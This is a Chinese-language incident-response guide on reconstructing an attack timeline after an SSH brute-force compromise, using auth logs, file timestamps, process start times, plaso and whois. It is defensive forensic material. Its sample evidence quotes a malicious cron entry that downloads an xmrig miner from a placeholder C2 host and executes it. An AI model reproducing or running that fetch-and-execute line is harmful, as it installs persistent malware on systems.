# 攻击链还原：从日志与文件把攻击时序拼回来

> 定位：失陷后把「谁、在何时、从哪里、用什么方式进来、做了什么、留下了什么」按时间顺序还原成一条证据链。这是应急溯源的核心交付物。
> 本文为自写原创方法论，来源链接见文末。

---

## 0. 攻击链还原的核心方法论

**锚点交叉验证**：单类证据（日志或文件时间戳）都可能被篡改或缺失，只有把「日志时间戳 + 文件 mtime/ctime/atime + 进程启动时间 + 网络连接」四类证据放到同一条时间线上互相印证，才能还原出可信的攻击时序。

```bash
# 先确认系统时间与时钟漂移（时间线对齐的前提）
date; timedatectl 2>/dev/null | grep -E 'Local time|NTP'
# 若目标机时钟不准，所有日志时间戳都要做偏移校正——这是时间线分析第一大坑
```

判据：若 `timedatectl` 显示 NTP 未同步或时钟有漂移，攻击时间戳会整体偏移，需先估算偏移量再对齐外部证据（如 C2 日志、威胁情报时间）。

---

## 1. SSH 爆破失陷调查

### 1.1 爆破痕迹聚合（lastb + secure）

```bash
# 失败登录（btmp）按 IP 聚合
lastb -a -i | awk '{print $NF}' | sort | uniq -c | sort -rn | head -30

# 认证日志里 Failed password 聚合（字段级）
grep 'Failed password' /var/log/secure* /var/log/auth.log* 2>/dev/null | \
  awk '{for(i=1;i<=NF;i++) if($i=="from") print $(i+1)}' | sort | uniq -c | sort -rn | head -30

# 按时间窗切片：爆破发生的时间段
grep 'Failed password' /var/log/secure* 2>/dev/null | awk '{print $1, $2, $3}' | uniq -c | tail -30
```

判据：`lastb` 与 `secure` 两条源对同一 IP 的失败次数应基本一致；找到「爆破起始时间」与「峰值时间」。

### 1.2 爆破成功点定位（关键转折）

```bash
# 从大量 Failed 里定位紧随其后的 Accepted（成功即失陷时间点）
grep -E 'Accepted (password|publickey)' /var/log/secure* /var/log/auth.log* 2>/dev/null | \
  awk '{print $1, $2, $3, $9, $11, $13}'

# 把「失败 IP」与「成功 IP」做关联：同一 IP 先失败后成功 = 爆破成功
grep 'Failed password' /var/log/secure* 2>/dev/null | awk '{print $(NF-3)}' | sort -u > /tmp/fail_ips.txt
grep 'Accepted ' /var/log/secure* 2>/dev/null | awk '{for(i=1;i<=NF;i++) if($i=="from") print $(i+1)}' | sort -u > /tmp/ok_ips.txt
echo "=== 既爆破又成功的 IP（重点怀疑对象） ==="; comm -12 /tmp/fail_ips.txt /tmp/ok_ips.txt
```

判据：出现在 `comm -12` 交集里的 IP = **爆破成功**，`Accepted` 那条的时间戳就是失陷时刻。

### 1.3 爆破后痕迹（提权与持久化证据）

```bash
# 爆破成功后攻击者常做：加公钥 / 加 UID=0 账户 / 加特权账户 / 装 crontab
# ① authorized_keys 新增（时间戳与 Accepted 时间接近）
find /home /root -name authorized_keys -mmin -$(( ( $(date +%s) - $(date -d "2025-08-01" +%s) ) / 60 )) -exec ls -la {} \; 2>/dev/null
# ② 新增 UID=0 账户
grep -E 'x:0:' /etc/passwd
# ③ 新增 sudo 权限 / NOPASSWD
grep -E 'NOPASSWD|ALL=' /etc/sudoers /etc/sudoers.d/* 2>/dev/null
# ④ 计划任务（爆破成功时间之后的）
find /etc/cron.d /var/spool/cron -type f -newermt "<Accepted时间>" -exec sh -c 'echo "--- $1 ---"; cat "$1"' _ {} \; 2>/dev/null
```

判据：这些痕迹的「时间戳」应落在 `Accepted` 之后几分钟到几小时内——时间先后关系是证据链的关键环节。

---

## 2. 时间线构建：多源时间戳交叉验证

### 2.1 文件时间戳三件套（mtime/ctime/atime）

```bash
# 找失陷时间窗内「被修改/创建/访问」的文件
WINDOW_START="2025-08-01"; WINDOW_END="2025-08-03"

# mtime（内容修改）——最常用
find / -newermt "$WINDOW_START" ! -newermt "$WINDOW_END" -type f -printf '%TY-%Tm-%Td %TH:%TM:%TS %p\n' 2>/dev/null | sort | head -100

# ctime（元数据/权限/属主变更）——攻击者 chmod/chown 会留下
find / -newerct "$WINDOW_START" ! -newerct "$WINDOW_END" -type f -printf '%TY-%Tm-%Td %TH:%TM:%TS %p\n' 2>/dev/null | sort | head -100

# atime（访问时间）——攻击者读敏感文件会更新（注意：很多系统挂载 noatime 或 relatime，atime 可能不可靠）
find / -newerat "$WINDOW_START" ! -newerat "$WINDOW_END" -type f -printf '%TY-%Tm-%Td %TH:%TM:%TS %p\n' 2>/dev/null | sort | head -100

# 单文件三时间戳
stat /<可疑文件>
```

判据：
- **mtime > ctime**：不可能（ctime 总 ≥ mtime），若出现说明时间戳被手工篡改（`touch` 伪造），是反取证线索。
- mtime 与 ctime 接近 = 文件「被创建或重写」；ctime 明显晚于 mtime = 文件内容没变但权限/属主被改（如 `chmod +x`、`chown root`）。
- atime 依赖挂载选项（`relatime`/`noatime` 下 atime 不更新），**不能单独依赖 atime**，只作辅助。

### 2.2 日志时间戳 + 进程启动时间对齐

```bash
# 进程启动时间（精确到秒）
ps -eo pid,lstart,comm,args --sort=lstart | tail -40
# 或读 /proc/<pid>/stat 第 22 字段（启动 tick）
cat /proc/<pid>/stat | awk '{print $22}'

# 把「进程启动时间」与「日志里攻击动作时间」放一起排序
# 示例：手动整理成时间线 CSV：时间 | 来源 | 事件
# 2025-08-01 03:11:22 | secure | Accepted password for root from 1.2.3.4
# 2025-08-01 03:12:01 | /proc  | 进程 /tmp/xmrig 启动
# 2025-08-01 03:12:30 | cron   | CMD (wget http://c2/xmrig -O /tmp/xmrig)
```

判据：若「进程启动时间」在「拉活命令时间」之后几秒，且「拉活命令时间」在「登录时间」之后，三者能连成一条逻辑链 = 证据成立。

### 2.3 交叉验证清单（防单点失效）

| 事件 | 主证据 | 交叉验证源 |
| :--- | :--- | :--- |
| 登录 | secure/auth.log `Accepted` | last、lastlog、journald、auditd `-l` |
| 命令执行 | bash_history | auditd EXECVE、pspy、cron 日志 |
| 文件落地 | 文件 mtime | auditd `-k <文件监控key>`、`rpm -V`/`debsums` |
| 进程启动 | /proc start | ps lstart、systemd unit、cron |
| 网络外连 | ss / /proc/net/tcp | 防火墙日志、态势感知、C2 侧日志 |

---

## 3. plaso 超级时间线工作流

plaso（log2timeline）把「文件系统 + 日志 + 注册表 + 内存」等异构证据聚合成统一时间线，是攻击时序还原的业界标准工具。

### 3.1 采集与生成

```bash
# 用 log2timeline 把目标证据目录（镜像挂载点或文件系统）生成 plaso 存储
# 针对已挂载的镜像/目录
log2timeline.py /output/evidence.plaso /mnt/evidence

# 只处理特定解析器（如 linux 相关）可加快
log2timeline.py --parsers "linux" /output/evidence.plaso /mnt/evidence

# 追加其他证据源（日志目录单独处理）
log2timeline.py --partitions all /output/evidence.plaso /mnt/evidence
```

### 3.2 查询与导出

```bash
# psort 按时间排序导出为 CSV/JSON 供分析
psort.py -o l2tcsv -w /output/timeline.csv /output/evidence.plaso

# 按时间窗过滤
psort.py -o l2tcsv -w /output/timeline.csv /output/evidence.plaso "date > '2025-08-01 00:00:00' AND date < '2025-08-03 23:59:59'"

# 只看某类事件（如文件系统事件）
psort.py -o l2tcsv -w /output/fs.csv /output/evidence.plaso "parser == 'filestat'"
```

判据与用法：
- 导出 CSV 后按「时间」排序，攻击者动作会像流水账一样摊开：登录 → 下载 → 落地 → 执行 → 持久化 → 外连。
- 用 `grep` 在 CSV 里搜「可疑 IP」「可疑文件名」「可疑命令」，能快速定位攻击链的每个节点。
- plaso 的价值在于**异构归一**：把日志时间戳（不同时区/格式）和文件时间戳统一成可排序的时间轴，消除手工对时的误差。

### 3.3 超级时间线的输出解读

CSV 关键列：`datetime, timestamp_desc, source, source_long, message, ...`
- `timestamp_desc`：事件类型（`Content Modification Time`、`Last Login Time` 等）。
- `source`：证据来源文件/位置。
- `message`：事件详情（含命令、路径、用户等）。

```bash
# 快速看事件类型分布
cut -d',' -f2 /output/timeline.csv | sort | uniq -c | sort -rn | head -20
```

---

## 4. 证据链闭环（交付物形式）

把还原结果落成结构化证据链，每步「时间 + 来源 + 证据文件 + 结论」：

```text
[时间]  2025-08-01 03:11:22
[事件]  攻击者 1.2.3.4 爆破 SSH 成功登录 root
[证据]  /var/log/secure: "Accepted password for root from 1.2.3.4 port 54321 ssh2"
[结论]  初始访问点，失陷时刻

[时间]  2025-08-01 03:12:30
[事件]  cron 定时拉取并执行挖矿程序
[证据]  /etc/cron.d/x: "*/1 * * * * root wget http://c2/xmrig -O /tmp/xmrig && sh /tmp/xmrig"
[结论]  持久化拉活链

[时间]  2025-08-01 03:12:45
[事件]  矿工进程 /tmp/xmrig 启动并外连矿池
[证据]  /proc/<pid>/cmdline: "--algo rx/0 --url pool.example.com:3333"; ss -tnp: pid -> pool:3333
[结论]  影响面（挖矿）
```

---

## 5. 可疑 IP 溯源（whois / 威胁情报）

```bash
IP=1.2.3.4
# whois 基本信息
whois $IP | grep -iE 'netname|country|org-name|org|descr|address' | head -20

# 反查域名（PTR）
dig -x $IP +short 2>/dev/null || host $IP 2>/dev/null

# 威胁情报（开源接口，需联网；离线场景记下 IP 事后查）
# VirusTotal / AbuseIPDB / Shodan / Censys 等平台按 IP 查询历史恶意行为

# 关联本地其他证据里是否出现同一 IP（跨主机横向线索）
grep -r "$IP" /var/log/ 2>/dev/null | head -20
```

判据与注意：
- whois 的 `netname`/`country` 可判断 IP 归属（IDC/云/VPS = 常见攻击跳板；家庭宽带 = 可能被控肉鸡）。
- 同一 IP 在本机多处日志（SSH + web + cron）出现 = 攻击者或 C2，是溯源的关键锚点。
- 威胁情报查出的「历史恶意标签」（如 `bruteforce`、`C2`、`mining`）可与本地行为互相印证。

---

## 来源

- plaso / log2timeline 超级时间线：https://github.com/log2timeline/plaso
- 本库 `cookbook-linux/08-暴力破解.md` 0x02「SSH 暴力破解」（GPL-3.0 原文）
- 本库 `cookbook-linux/15-小技巧.md` 0x14「查找特定时间段内的文件」（GPL-3.0 原文）
- 本库 `cookbook-linux/06-远控后门.md` 0x03「外连 IP 溯源」（GPL-3.0 原文）
- MITRE ATT&CK Linux Matrix（初始访问/持久化战术）：https://attack.mitre.org/matrices/enterprise/linux/
